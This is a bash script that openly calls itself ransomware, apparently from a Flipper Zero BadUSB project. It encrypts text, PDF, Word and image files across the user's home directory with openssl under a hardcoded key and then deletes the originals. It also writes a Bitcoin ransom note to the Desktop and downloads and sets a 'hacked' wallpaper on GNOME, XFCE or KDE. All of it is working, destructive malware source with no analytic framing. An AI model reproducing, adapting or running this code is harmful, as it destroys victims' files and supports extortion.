#!/bin/bash

LOG="$HOME/ransom-log.txt"
TARGET="$HOME"
KEY="mySuperSecretKey123"
NOTE="$HOME/Desktop/README.txt"
IMG_URL="https://raw.githubusercontent.com/ninakisyova/flipperzero-badUSB/main/hacked-wallpaper.png"
IMG_PATH="/tmp/hacked-wallpaper.png"

echo "[*] Starting ransomware at $(date)" >> "$LOG"

# === Encrypt targeted files ===
find "$TARGET" -type f \( -iname "*.txt" -o -iname "*.pdf" -o -iname "*.doc" -o -iname "*.jpg" -o -iname "*.png" \) 2>/dev/null | while read file; do
    openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -k "$KEY" 2>>"$LOG" && rm "$file"
    echo "[+] Encrypted: $file" >> "$LOG"
done

# === Create ransom note ===
cat <<EOF > "$NOTE"
YOUR FILES HAVE BEEN ENCRYPTED!

To restore them:
Send 0.05 BTC to:
bc1qexamplefakebtcaddress

Contact: decrypt@protonmail.com
EOF
echo "[+] Ransom note written to $NOTE" >> "$LOG"

# === Detect desktop environment ===
DESKTOP_ENV=$(echo "$XDG_CURRENT_DESKTOP" | tr '[:upper:]' '[:lower:]')

# === Download wallpaper ===
wget "$IMG_URL" -O "$IMG_PATH" && echo "[+] Wallpaper downloaded to $IMG_PATH" >> "$LOG"

# === Set wallpaper based on desktop environment ===
case "$DESKTOP_ENV" in
    *gnome*)
        gsettings set org.gnome.desktop.background picture-uri "file://$IMG_PATH" && echo "[+] GNOME wallpaper set" >> "$LOG"
        ;;
    *xfce*)
        xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -s "$IMG_PATH"
        xfdesktop --reload
        echo "[+] XFCE wallpaper set" >> "$LOG"
        ;;
    *kde*)
        plasmashell --replace &
        sleep 1
        qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript "
        var allDesktops = desktops();
        for (i=0;i<allDesktops.length;i++) {
            d = allDesktops[i];
            d.wallpaperPlugin = 'org.kde.image';
            d.currentConfigGroup = Array('Wallpaper', 'org.kde.image', 'General');
            d.writeConfig('Image', 'file://$IMG_PATH');
        }"
        echo "[+] KDE wallpaper set" >> "$LOG"
        ;;
    *)
        echo "[-] Unknown desktop environment: $DESKTOP_ENV" >> "$LOG"
        ;;
esac

echo "[*] Ransomware finished at $(date)" >> "$LOG"
